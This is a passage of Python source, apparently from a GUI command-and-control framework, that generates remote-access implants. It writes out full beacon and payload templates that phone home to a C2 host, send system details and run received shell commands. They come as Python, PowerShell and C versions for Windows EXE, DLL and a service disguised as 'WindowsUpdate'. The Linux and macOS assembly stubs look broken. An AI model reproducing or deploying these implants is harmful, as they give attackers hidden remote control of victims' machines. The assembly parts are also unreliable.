        output_path_input = QLineEdit()
        output_path_input.setPlaceholderText("Path to save beacon")
        layout.addRow("Output Path:", output_path_input)
        
        browse_button = QPushButton("Browse")
        browse_button.clicked.connect(lambda: output_path_input.setText(QFileDialog.getSaveFileName(dialog, "Save Beacon")[0]))
        layout.addRow("", browse_button)
        
        button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        layout.addRow(button_box)
        
        if button_box.exec_() == QDialog.Accepted:
            host = host_input.text()
            port = port_input.value()
            beacon_type = type_combo.currentText()
            ssl_enabled = ssl_checkbox.isChecked()
            profile_path = profile_input.text() if profile_input.text() else None
            sleep_time = sleep_input.value()
            jitter = jitter_input.value()
            stealth_mode = stealth_checkbox.isChecked()
            output_path = output_path_input.text()
            
            if host and port and output_path:
                try:
                    if stealth_mode:
                        beacon = StealthBeacon(host, port, beacon_type, ssl_enabled, profile_path)
                    else:
                        beacon = OptimizedBeacon(host, port, beacon_type, ssl_enabled, profile_path)
                    
                    beacon.sleep_time = sleep_time
                    beacon.jitter = jitter
                    
                    beacon_code = self.generate_beacon_code(beacon)
                    
                    with open(output_path, 'w') as f:
                        f.write(beacon_code)
                    
                    self.log_entries.append({
                        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "action": "generate_beacon",
                        "target": output_path,
                        "status": "success"
                    })
                    
                    self.status_bar.showMessage(f"Beacon generated and saved to {output_path}")
                    
                    QMessageBox.information(self, "Success", f"Beacon generated and saved to {output_path}")
                except Exception as e:
                    self.log_entries.append({
                        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "action": "generate_beacon",
                        "target": output_path,
                        "status": "failed",
                        "detail": str(e)
                    })
                    
                    self.status_bar.showMessage(f"Failed to generate beacon: {str(e)}")
                    
                    QMessageBox.critical(self, "Error", f"Failed to generate beacon: {str(e)}")
            else:
                QMessageBox.warning(self, "Error", "Host, port, and output path are required")
                
    def generate_beacon_code(self, beacon):
        beacon_code = f"""#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import time
import json
import random
import base64
import socket
import requests
import threading
import platform
import getpass
from datetime import datetime

class Beacon:
    def __init__(self):
        self.c2_host = "{beacon.c2_host}"
        self.c2_port = {beacon.c2_port}
        self.c2_type = "{beacon.c2_type}"
        self.ssl_enabled = {beacon.ssl_enabled}
        self.beacon_id = self.generate_beacon_id()
        self.sleep_time = {beacon.sleep_time}
        self.jitter = {beacon.jitter}
        self.running = False
        
    def generate_beacon_id(self):
        return f"{{''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(8))}}"
    
    def encrypt_data(self, data):
        return base64.b64encode(data.encode()).decode()
    
    def decrypt_data(self, data):
        return base64.b64decode(data).decode()
    
    def get_system_info(self):
        info = {{
            "os": platform.system(),
            "hostname": platform.node(),
            "user": getpass.getuser(),
            "architecture": platform.machine(),
            "version": platform.version(),
            "beacon_id": self.beacon_id
        }}
        
        if info["os"] == "Windows":
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")
                info["windows_version"] = winreg.QueryValueEx(key, "ProductName")[0]
                info["windows_build"] = winreg.QueryValueEx(key, "CurrentBuild")[0]
                winreg.CloseKey(key)
            except:
                pass
        
        return info
    
    def register_beacon(self):
        try:
            sys_info = self.get_system_info()
            data = json.dumps(sys_info)
            encrypted_data = self.encrypt_data(data)
            
            headers = {{
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "*/*",
                "Connection": "keep-alive"
            }}
            
            url = f"{{'https' if self.ssl_enabled else 'http'}}://{{self.c2_host}}:{{self.c2_port}}/register"
            
            response = requests.post(url, data=encrypted_data, headers=headers, timeout=10, verify=False)
            
            return response.status_code == 200
        except:
            return False
    
    def get_tasks(self):
        try:
            headers = {{
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "*/*",
                "Connection": "keep-alive"
            }}
            
            url = f"{{'https' if self.ssl_enabled else 'http'}}://{{self.c2_host}}:{{self.c2_port}}/tasks"
            
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            if response.status_code == 200:
                encrypted_data = response.text
                data = self.decrypt_data(encrypted_data)
                
                if data:
                    tasks = json.loads(data).get("tasks", [])
                    return tasks
            
            return []
        except:
            return []
    
    def send_result(self, task_id, result):
        try:
            data = json.dumps({{"task_id": task_id, "result": result}})
            encrypted_data = self.encrypt_data(data)
            
            headers = {{
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "*/*",
                "Connection": "keep-alive",
                "Content-Type": "application/x-www-form-urlencoded"
            }}
            
            url = f"{{'https' if self.ssl_enabled else 'http'}}://{{self.c2_host}}:{{self.c2_port}}/results"
            
            response = requests.post(url, data=encrypted_data, headers=headers, timeout=10, verify=False)
            
            return response.status_code == 200
        except:
            return False
    
    def execute_task(self, task):
        try:
            task_type = task.get("type")
            task_data = task.get("data")
            task_id = task.get("task_id")
            
            result = {{"status": "error", "message": "Unknown task type"}}
            
            if task_type == "shell":
                try:
                    import subprocess
                    process = subprocess.Popen(
                        task_data, 
                        shell=True, 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    stdout, stderr = process.communicate()
                    
                    result = {{
                        "status": "success",
                        "exit_code": process.returncode,
                        "stdout": stdout,
                        "stderr": stderr
                    }}
                except Exception as e:
                    result = {{
                        "status": "error",
                        "message": str(e)
                    }}
            
            elif task_type == "kill":
                self.running = False
                result = {{
                    "status": "success",
                    "message": "Beacon shutting down"
                }}
            
            self.send_result(task_id, result)
            return result
        except Exception as e:
            result = {{
                "status": "error",
                "message": str(e)
            }}
            self.send_result(task_id, result)
            return result
    
    def start(self):
        try:
            if not self.register_beacon():
                return False
            
            self.running = True
            
            while self.running:
                try:
                    actual_sleep = self.sleep_time * (1 - self.jitter + (2 * self.jitter * random.random()))
                    time.sleep(actual_sleep)
                    
                    tasks = self.get_tasks()
                    
                    for task in tasks:
                        self.execute_task(task)
                
                except KeyboardInterrupt:
                    self.running = False
                except:
                    time.sleep(30)
            
            return True
        except:
            return False

if __name__ == "__main__":
    beacon = Beacon()
    beacon.start()
"""
        return beacon_code
        
    def generate_payload(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Generate Payload")
        layout = QFormLayout(dialog)
        
        payload_type_combo = QComboBox()
        payload_type_combo.addItems(["Windows EXE", "Windows DLL", "Windows Service", "Linux ELF", "MacOS Mach-O", "PowerShell", "Python", "Shellcode"])
        layout.addRow("Payload Type:", payload_type_combo)
        
        listener_combo = QComboBox()
        for i in range(self.listeners_table.rowCount()):
            listener_name = self.listeners_table.item(i, 0).text()
            listener_combo.addItem(listener_name)
        layout.addRow("Listener:", listener_combo)
        
        architecture_combo = QComboBox()
        architecture_combo.addItems(["x86", "x64"])
        layout.addRow("Architecture:", architecture_combo)
        
        format_combo = QComboBox()
        format_combo.addItems(["exe", "dll", "service", "raw", "py", "ps1"])
        layout.addRow("Format:", format_combo)
        
        output_path_input = QLineEdit()
        output_path_input.setPlaceholderText("Path to save payload")
        layout.addRow("Output Path:", output_path_input)
        
        browse_button = QPushButton("Browse")
        browse_button.clicked.connect(lambda: output_path_input.setText(QFileDialog.getSaveFileName(dialog, "Save Payload")[0]))
        layout.addRow("", browse_button)
        
        button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        layout.addRow(button_box)
        
        if button_box.exec_() == QDialog.Accepted:
            payload_type = payload_type_combo.currentText()
            listener = listener_combo.currentText()
            architecture = architecture_combo.currentText()
            format_type = format_combo.currentText()
            output_path = output_path_input.text()
            
            if listener and output_path:
                try:
                    payload_code = self.generate_payload_code(payload_type, listener, architecture, format_type)
                    
                    with open(output_path, 'w') as f:
                        f.write(payload_code)
                    
                    self.log_entries.append({
                        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "action": "generate_payload",
                        "target": output_path,
                        "status": "success"
                    })
                    
                    self.status_bar.showMessage(f"Payload generated and saved to {output_path}")
                    
                    QMessageBox.information(self, "Success", f"Payload generated and saved to {output_path}")
                except Exception as e:
                    self.log_entries.append({
                        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "action": "generate_payload",
                        "target": output_path,
                        "status": "failed",
                        "detail": str(e)
                    })
                    
                    self.status_bar.showMessage(f"Failed to generate payload: {str(e)}")
                    
                    QMessageBox.critical(self, "Error", f"Failed to generate payload: {str(e)}")
            else:
                QMessageBox.warning(self, "Error", "Listener and output path are required")
                
    def generate_payload_code(self, payload_type, listener, architecture, format_type):
        listener_info = {}
        for i in range(self.listeners_table.rowCount()):
            if self.listeners_table.item(i, 0).text() == listener:
                listener_info = {
                    "name": listener,
                    "type": self.listeners_table.item(i, 1).text(),
                    "host": self.listeners_table.item(i, 2).text(),
                    "port": int(self.listeners_table.item(i, 3).text())
                }
                break
        
        if not listener_info:
            raise Exception("Listener not found")
        
        if payload_type == "Windows EXE":
            return self.generate_exe_payload(listener_info, architecture, format_type)
        elif payload_type == "Windows DLL":
            return self.generate_dll_payload(listener_info, architecture, format_type)
        elif payload_type == "Windows Service":
            return self.generate_service_payload(listener_info, architecture, format_type)
        elif payload_type == "Linux ELF":
            return self.generate_elf_payload(listener_info, architecture, format_type)
        elif payload_type == "MacOS Mach-O":
            return self.generate_macho_payload(listener_info, architecture, format_type)
        elif payload_type == "PowerShell":
            return self.generate_powershell_payload(listener_info, architecture, format_type)
        elif payload_type == "Python":
            return self.generate_python_payload(listener_info, architecture, format_type)
        elif payload_type == "Shellcode":
            return self.generate_shellcode_payload(listener_info, architecture, format_type)
        else:
            raise Exception(f"Unsupported payload type: {payload_type}")
    
    def generate_exe_payload(self, listener_info, architecture, format_type):
        if format_type != "exe":
            raise Exception("Invalid format for Windows EXE payload")
        
        payload_code = f"""#include <windows.h>
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#define C2_HOST "{listener_info['host']}"
#define C2_PORT {listener_info['port']}
#define SLEEP_TIME 5000

DWORD WINAPI BeaconThread(LPVOID lpParameter) {{
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[4096];
    int bytesRead;
    
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {{
        return 1;
    }}
    
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {{
        WSACleanup();
        return 1;
    }}
    
    server.sin_family = AF_INET;
    server.sin_port = htons(C2_PORT);
    server.sin_addr.s_addr = inet_addr(C2_HOST);
    
    while (connect(sock, (struct sockaddr *)&server, sizeof(server)) != 0) {{
        Sleep(SLEEP_TIME);
    }}
    
    // Send system information
    char sysInfo[1024];
    DWORD bufSize = sizeof(sysInfo);
    GetComputerNameA(sysInfo, &bufSize);
    send(sock, sysInfo, strlen(sysInfo), 0);
    
    // Main beacon loop
    while (1) {{
        // Receive commands
        bytesRead = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytesRead <= 0) break;
        
        buffer[bytesRead] = '\\0';
        
        // Execute command
        FILE *pipe;
        char result[4096] = {{0}};
        
        pipe = _popen(buffer, "r");
        if (pipe) {{
            while (fgets(result, sizeof(result), pipe) != NULL) {{
                send(sock, result, strlen(result), 0);
                memset(result, 0, sizeof(result));
            }}
            _pclose(pipe);
        }}
        
        Sleep(SLEEP_TIME);
    }}
    
    closesocket(sock);
    WSACleanup();
    return 0;
}}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
    HANDLE hThread = CreateThread(NULL, 0, BeaconThread, NULL, 0, NULL);
    if (hThread) {{
        CloseHandle(hThread);
    }}
    
    // Keep the process running
    while (1) {{
        Sleep(60000);
    }}
    
    return 0;
}}
"""
        return payload_code
    
    def generate_dll_payload(self, listener_info, architecture, format_type):
        if format_type != "dll":
            raise Exception("Invalid format for Windows DLL payload")
        
        payload_code = f"""#include <windows.h>
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#define C2_HOST "{listener_info['host']}"
#define C2_PORT {listener_info['port']}
#define SLEEP_TIME 5000

DWORD WINAPI BeaconThread(LPVOID lpParameter) {{
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[4096];
    int bytesRead;
    
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {{
        return 1;
    }}
    
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {{
        WSACleanup();
        return 1;
    }}
    
    server.sin_family = AF_INET;
    server.sin_port = htons(C2_PORT);
    server.sin_addr.s_addr = inet_addr(C2_HOST);
    
    while (connect(sock, (struct sockaddr *)&server, sizeof(server)) != 0) {{
        Sleep(SLEEP_TIME);
    }}
    
    // Send system information
    char sysInfo[1024];
    DWORD bufSize = sizeof(sysInfo);
    GetComputerNameA(sysInfo, &bufSize);
    send(sock, sysInfo, strlen(sysInfo), 0);
    
    // Main beacon loop
    while (1) {{
        // Receive commands
        bytesRead = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytesRead <= 0) break;
        
        buffer[bytesRead] = '\\0';
        
        // Execute command
        FILE *pipe;
        char result[4096] = {{0}};
        
        pipe = _popen(buffer, "r");
        if (pipe) {{
            while (fgets(result, sizeof(result), pipe) != NULL) {{
                send(sock, result, strlen(result), 0);
                memset(result, 0, sizeof(result));
            }}
            _pclose(pipe);
        }}
        
        Sleep(SLEEP_TIME);
    }}
    
    closesocket(sock);
    WSACleanup();
    return 0;
}}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
    switch (ul_reason_for_call) {{
        case DLL_PROCESS_ATTACH:
            CreateThread(NULL, 0, BeaconThread, NULL, 0, NULL);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }}
    return TRUE;
}}
"""
        return payload_code
    
    def generate_service_payload(self, listener_info, architecture, format_type):
        if format_type != "service":
            raise Exception("Invalid format for Windows Service payload")
        
        payload_code = f"""#include <windows.h>
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#define C2_HOST "{listener_info['host']}"
#define C2_PORT {listener_info['port']}
#define SLEEP_TIME 5000
#define SERVICE_NAME "WindowsUpdate"

SERVICE_STATUS        g_ServiceStatus = {{0}};
SERVICE_STATUS_HANDLE   g_StatusHandle = NULL;
HANDLE                 g_hServiceStopEvent = INVALID_HANDLE_VALUE;

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
VOID WINAPI ServiceCtrlHandler(DWORD Opcode);
DWORD WINAPI BeaconThread(LPVOID lpParameter);

int main(int argc, char *argv[]) {{
    SERVICE_TABLE_ENTRY ServiceTable[] =
    {{
        {{SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain}},
        {{NULL, NULL}}
    }};

    if (StartServiceCtrlDispatcher(ServiceTable) == 0) {{
        return 1;
    }}
    return 0;
}}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {{
    DWORD status = 0;
    DWORD specificError = 0xfffffff;

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;
    g_ServiceStatus.dwWaitHint = 0;

    g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
    if (g_StatusHandle == (SERVICE_STATUS_HANDLE)0) {{
        return;
    }}

    g_hServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (g_hServiceStopEvent == NULL) {{
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = GetLastError();
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        return;
    }}

    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    // Start beacon thread
    CreateThread(NULL, 0, BeaconThread, NULL, 0, NULL);

    WaitForSingleObject(g_hServiceStopEvent, INFINITE);

    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    return;
}}

VOID WINAPI ServiceCtrlHandler(DWORD Opcode) {{
    switch (Opcode) {{
        case SERVICE_CONTROL_PAUSE:
            g_ServiceStatus.dwCurrentState = SERVICE_PAUSED;
            break;
        case SERVICE_CONTROL_CONTINUE:
            g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
            break;
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            g_ServiceStatus.dwWin32ExitCode = 0;
            g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
            SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
            SetEvent(g_hServiceStopEvent);
            break;
        default:
            break;
    }}
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    return;
}}

DWORD WINAPI BeaconThread(LPVOID lpParameter) {{
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[4096];
    int bytesRead;
    
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {{
        return 1;
    }}
    
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {{
        WSACleanup();
        return 1;
    }}
    
    server.sin_family = AF_INET;
    server.sin_port = htons(C2_PORT);
    server.sin_addr.s_addr = inet_addr(C2_HOST);
    
    while (connect(sock, (struct sockaddr *)&server, sizeof(server)) != 0) {{
        Sleep(SLEEP_TIME);
    }}
    
    char sysInfo[1024];
    DWORD bufSize = sizeof(sysInfo);
    GetComputerNameA(sysInfo, &bufSize);
    send(sock, sysInfo, strlen(sysInfo), 0);
    
    while (1) {{
        // Receive commands
        bytesRead = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytesRead <= 0) break;
        
        buffer[bytesRead] = '\\0';
        
        FILE *pipe;
        char result[4096] = {{0}};
        
        pipe = _popen(buffer, "r");
        if (pipe) {{
            while (fgets(result, sizeof(result), pipe) != NULL) {{
                send(sock, result, strlen(result), 0);
                memset(result, 0, sizeof(result));
            }}
            _pclose(pipe);
        }}
        
        Sleep(SLEEP_TIME);
    }}
    
    closesocket(sock);
    WSACleanup();
    return 0;
}}
"""
        return payload_code
    
    def generate_elf_payload(self, listener_info, architecture, format_type):
        if format_type not in ["elf", "py"]:
            raise Exception("Invalid format for Linux ELF payload")
        
        if format_type == "elf":
            payload_code = f"""section .text
global _start

_start:
    ; Create socket
    push 0x29
    pop rax
    cdq
    push rdx
    push rsi
    mov rdi, rsp
    push rdx
    push rdi
    push 0x2
    mov al, 0x41
    syscall
    
    xchg rdi, rax
    
    ; Connect to C2 server
    mov rax, 0x{int(listener_info['host'].replace('.', '')):08x}
    push rax
    mov rax, 0x{listener_info['port']:04x}0000
    push rax
    mov rsi, rsp
    push 0x10
    pop rdx
    push rsi
    push rdi
    mov al, 0x2a
    syscall
    
    ; Send system information
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    mov rax, 0x3f
    syscall
    
    ; Main beacon loop
beacon_loop:
    ; Receive commands
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 0x3f
    syscall
    
    ; Execute command
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    push rax
    push rdi
    push rsi
    push rdx
    mov rax, 0x3b
    pop rsi
    pop rdx
    pop rdi
    syscall
    
    ; Send result
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 0x40
    syscall
    
    ; Sleep
    mov rax, 0x23
    mov rdi, 0x{listener_info['port']:08x}
    xor rsi, rsi
    xor rdx, rdx
    syscall
    
    jmp beacon_loop
"""
        else:  # Python
            payload_code = f"""#!/usr/bin/env python3
import os
import sys
import time
import socket
import subprocess
import threading

C2_HOST = "{listener_info['host']}"
C2_PORT = {listener_info['port']}
SLEEP_TIME = 5

def beacon():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((C2_HOST, C2_PORT))
        
        # Send system information
        sys_info = f"Hostname: {{os.uname()[1]}}\\nOS: {{os.uname()[0]}} {{os.uname()[2]}}\\nUser: {{os.getlogin()}}"
        sock.send(sys_info.encode())
        
        # Main beacon loop
        while True:
            # Receive commands
            command = sock.recv(4096).decode().strip()
            if not command:
                break
            
            # Execute command
            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                sock.send(result)
            except Exception as e:
                sock.send(str(e).encode())
            
            time.sleep(SLEEP_TIME)
    except:
        pass
    finally:
        sock.close()

if __name__ == "__main__":
    beacon_thread = threading.Thread(target=beacon)
    beacon_thread.daemon = True
    beacon_thread.start()
    
    # Keep the process running
    while True:
        time.sleep(60)
"""
        return payload_code
    
    def generate_macho_payload(self, listener_info, architecture, format_type):
        if format_type not in ["macho", "py"]:
            raise Exception("Invalid format for MacOS Mach-O payload")
        
        if format_type == "macho":
            payload_code = f"""section .text
global _main

_main:
    ; Create socket
    push 0x2000002
    mov rax, 0x2000000 + 0x61
    mov rdi, rsp
    mov rsi, 0x10
    mov rdx, 0x1
    syscall
    
    xchg rdi, rax
    
    ; Connect to C2 server
    mov rax, 0x{int(listener_info['host'].replace('.', '')):08x}
    push rax
    mov rax, 0x{listener_info['port']:04x}0000
    push rax
    mov rsi, rsp
    push 0x10
    pop rdx
    push rsi
    push rdi
    mov rax, 0x2000000 + 0x62
    syscall
    
    ; Send system information
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    mov rax, 0x2000000 + 0x4
    syscall
    
    ; Main beacon loop
beacon_loop:
    ; Receive commands
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 0x2000000 + 0x3
    syscall
    
    ; Execute command
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    push rax
    push rdi
    push rsi
    push rdx
    mov rax, 0x2000000 + 0x3b
    pop rsi
    pop rdx
    pop rdi
    syscall
    
    ; Send result
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x1000
    mov rax, 0x2000000 + 0x4
    syscall
    
    ; Sleep
    mov rax, 0x2000000 + 0x5d
    mov rdi, 0x{listener_info['port']:08x}
    xor rsi, rsi
    xor rdx, rdx
    syscall
    
    jmp beacon_loop
"""
        else:  # Python
            payload_code = f"""#!/usr/bin/env python3
import os
import sys
import time
import socket
import subprocess
import threading

C2_HOST = "{listener_info['host']}"
C2_PORT = {listener_info['port']}
SLEEP_TIME = 5

def beacon():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((C2_HOST, C2_PORT))
        
        # Send system information
        sys_info = f"Hostname: {{os.uname()[1]}}\\nOS: {{os.uname()[0]}} {{os.uname()[2]}}\\nUser: {{os.getlogin()}}"
        sock.send(sys_info.encode())
        
        # Main beacon loop
        while True:
            # Receive commands
            command = sock.recv(4096).decode().strip()
            if not command:
                break
            
            # Execute command
            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                sock.send(result)
            except Exception as e:
                sock.send(str(e).encode())
            
            time.sleep(SLEEP_TIME)
    except:
        pass
    finally:
        sock.close()

if __name__ == "__main__":
    beacon_thread = threading.Thread(target=beacon)
    beacon_thread.daemon = True
    beacon_thread.start()
    
    # Keep the process running
    while True:
        time.sleep(60)
"""
        return payload_code
    
    def generate_powershell_payload(self, listener_info, architecture, format_type):
        if format_type != "ps1":
            raise Exception("Invalid format for PowerShell payload")
        
        payload_code = f"""# PowerShell Beacon for Elaina C2 Framework

$C2Host = "{listener_info['host']}"
$C2Port = {listener_info['port']}
$SleepTime = 5

function Invoke-Beacon {{
    try {{
        $client = New-Object System.Net.Sockets.TCPClient($C2Host, $C2Port)
        $stream = $client.GetStream()
        
        # Send system information
        $sysInfo = "Hostname: $env:COMPUTERNAME`nOS: $((Get-WmiObject Win32_OperatingSystem).Caption)`nUser: $env:USERNAME"
        $data = [System.Text.Encoding]::UTF8.GetBytes($sysInfo)
        $stream.Write($data, 0, $data.Length)
        
        # Main beacon loop
        while ($client.Connected) {{
            # Receive commands
            $buffer = New-Object byte[] 4096
            $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
            if ($bytesRead -eq 0) {{ break }}
            
            $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
            
            # Execute command
            try {{
                $result = Invoke-Expression $command | Out-String
                $data = [System.Text.Encoding]::UTF8.GetBytes($result)
                $stream.Write($data, 0, $data.Length)
            }} catch {{
                $errorMsg = $_.Exception.Message
                $data = [System.Text.Encoding]::UTF8.GetBytes($errorMsg)
                $stream.Write($data, 0, $data.Length)
            }}
            
            Start-Sleep -Seconds $SleepTime
        }}
    }} catch {{
        # Silently ignore connection errors
    }} finally {{
        if ($stream) {{ $stream.Close() }}
        if ($client) {{ $client.Close() }}
    }}
}}

# Start beacon in a separate thread
$beaconThread = New-Object System.Threading.ThreadStart {{
    Invoke-Beacon
}}
$thread = New-Object System.Threading.Thread($beaconThread)
$thread.IsBackground = $true
$thread.Start()

# Keep the process running
try {{
    while ($true) {{
        Start-Sleep -Seconds 60
    }}
}} catch {{
    # Exit gracefully
}}
"""
        return payload_code
    
    def generate_python_payload(self, listener_info, architecture, format_type):
        if format_type != "py":
            raise Exception("Invalid format for Python payload")
        
        payload_code = f"""#!/usr/bin/env python3
import os
import sys
import time
import socket
import subprocess
import threading
import base64
import json
import platform
import getpass
import urllib.request
import urllib.parse
import ssl

C2_HOST = "{listener_info['host']}"
C2_PORT = {listener_info['port']}
C2_TYPE = "{listener_info['type'].lower()}"
SLEEP_TIME = 5
JITTER = 0.3

class Beacon:
    def __init__(self):
        self.c2_host = C2_HOST
        self.c2_port = C2_PORT
        self.c2_type = C2_TYPE
        self.beacon_id = self.generate_beacon_id()
        self.sleep_time = SLEEP_TIME
        self.jitter = JITTER
        self.running = False
        
    def generate_beacon_id(self):
        return f"{{''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(8))}}"
    
    def encrypt_data(self, data):
        return base64.b64encode(data.encode()).decode()
    
    def decrypt_data(self, data):
        return base64.b64decode(data).decode()
    
    def get_system_info(self):
        info = {{
            "os": platform.system(),
            "hostname": platform.node(),
            "user": getpass.getuser(),
            "architecture": platform.machine(),
            "version": platform.version(),
            "beacon_id": self.beacon_id
        }}
        
        if info["os"] == "Windows":
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")
                info["windows_version"] = winreg.QueryValueEx(key, "ProductName")[0]
                info["windows_build"] = winreg.QueryValueEx(key, "CurrentBuild")[0]
                winreg.CloseKey(key)
            except:
                pass
        
        return info
    
    def register_beacon(self):
        try:
            sys_info = self.get_system_info()
            data = json.dumps(sys_info)
            encrypted_data = self.encrypt_data(data)
            
            headers = {{
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "*/*",
                "Connection": "keep-alive"
            }}
            
            url = f"http://{{self.c2_host}}:{{self.c2_port}}/register"
            
            if self.c2_type == "https":
                context = ssl._create_unverified_context()
                req = urllib.request.Request(url, data=encrypted_data.encode(), headers=headers)
                response = urllib.request.urlopen(req, context=context)
            else:
                req = urllib.request.Request(url, data=encrypted_data.encode(), headers=headers)
                response = urllib.request.urlopen(req)
            
            return response.getcode() == 200
        except:
            return False
    
    def get_tasks(self):
        try:
            headers = {{
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "*/*",
                "Connection": "keep-alive"
            }}
            
            url = f"http://{{self.c2_host}}:{{self.c2_port}}/tasks"
            
            if self.c2_type == "https":
                context = ssl._create_unverified_context()
                req = urllib.request.Request(url, headers=headers)
                response = urllib.request.urlopen(req, context=context)
            else:
                req = urllib.request.Request(url, headers=headers)
                response = urllib.request.urlopen(req)
            
            if response.getcode() == 200:
                encrypted_data = response.read().decode()
                data = self.decrypt_data(encrypted_data)
                
                if data:
                    tasks = json.loads(data).get("tasks", [])
                    return tasks
            
            return []
        except:
            return []
    
    def send_result(self, task_id, result):
        try:
            data = json.dumps({{"task_id": task_id, "result": result}})
            encrypted_data = self.encrypt_data(data)
            
            headers = {{
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "*/*",
                "Connection": "keep-alive",
                "Content-Type": "application/x-www-form-urlencoded"
            }}
            
            url = f"http://{{self.c2_host}}:{{self.c2_port}}/results"
            
            if self.c2_type == "https":
                context = ssl._create_unverified_context()
